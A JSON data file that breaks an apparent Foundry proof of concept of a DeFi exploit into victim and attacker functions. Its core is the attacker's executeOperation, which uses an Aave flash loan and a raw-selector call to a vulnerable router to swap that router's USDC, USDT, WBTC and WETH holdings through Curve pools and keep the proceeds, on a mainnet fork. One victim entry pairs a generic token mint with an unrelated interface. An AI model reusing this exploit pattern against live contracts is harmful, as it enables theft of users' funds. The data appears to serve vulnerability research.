[
  {
    "contract/interface": "ISwapFlashLoan",
    "source_type": "victim_contract",
    "function_name": "flashLoan",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ISmartVaultManagerV2",
    "source_type": "victim_contract",
    "function_name": "mint",
    "original_code": "  function mint(\n    address _to,\n    uint256 _amount\n  )\n    public\n    hasMintPermission\n    canMint\n    returns (bool)\n  {\n    totalSupply_ = totalSupply_.add(_amount);\n    balances[_to] = balances[_to].add(_amount);\n    emit Mint(_to, _amount);\n    emit Transfer(address(0), _to, _amount);\n    return true;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ISmartVaultManagerV2",
    "source_type": "victim_contract",
    "function_name": "swap",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address asset,\n        uint256 amount,\n        uint256 premium,\n        address initator,\n        bytes calldata params\n    ) external payable returns (bool) {\n        weth.approve(address(aave), type(uint256).max);\n        bytes4 vulnFunctionSignature = hex\"f6ebebbb\";\n        bytes memory data = abi.encodeWithSelector(\n            vulnFunctionSignature,\n            usdc.balanceOf(address(router)),\n            0,\n            address(usdc),\n            address(usdt),\n            address(firstCrvPool),\n            0,\n            0\n        );\n        (bool success, bytes memory result) = address(router).call(data);\n        data = abi.encodeWithSelector(\n            vulnFunctionSignature,\n            usdt.balanceOf(address(router)),\n            0,\n            address(usdt),\n            address(weth),\n            address(secondCrvPool),\n            0,\n            0\n        );\n        (success, result) = address(router).call(data);\n        data = abi.encodeWithSelector(\n            vulnFunctionSignature,\n            wbtc.balanceOf(address(router)),\n            0,\n            address(wbtc),\n            address(weth),\n            address(secondCrvPool),\n            0,\n            0\n        );\n        (success, result) = address(router).call(data);\n\n        weth.approve(address(secondCrvPool), type(uint256).max);\n        secondCrvPool.exchange(2, 1, weth.balanceOf(address(this)), 0);\n        data = abi.encodeWithSelector(\n            vulnFunctionSignature,\n            weth.balanceOf(address(router)),\n            0,\n            address(weth),\n            address(wbtc),\n            address(secondCrvPool),\n            0,\n            0\n        );\n        (success, result) = address(router).call(data);\n        wbtc.approve(address(secondCrvPool), type(uint256).max);\n        secondCrvPool.exchange(1, 2, wbtc.balanceOf(address(this)), 0);\n        return true;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 18_523_344 - 1);\n        cheats.label(address(weth), \"WETH\");\n        cheats.label(address(secondCrvPool), \"Curve.fi: USDT/WBTC/WETH Pool\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExpolit",
    "original_code": "    function testExpolit() public {\n        emit log_named_decimal_uint(\"attacker balance before attack\", weth.balanceOf(address(this)), weth.decimals());\n\n        aave.flashLoanSimple(address(this), address(weth), 27_255_000_000_000_000_000_000, new bytes(1), 0);\n        emit log_named_decimal_uint(\"attacker balance after attack\", weth.balanceOf(address(this)), weth.decimals());\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ICurve",
    "source_type": "victim_contract",
    "function_name": "exchange",
    "original_code": "",
    "description": ""
  }
]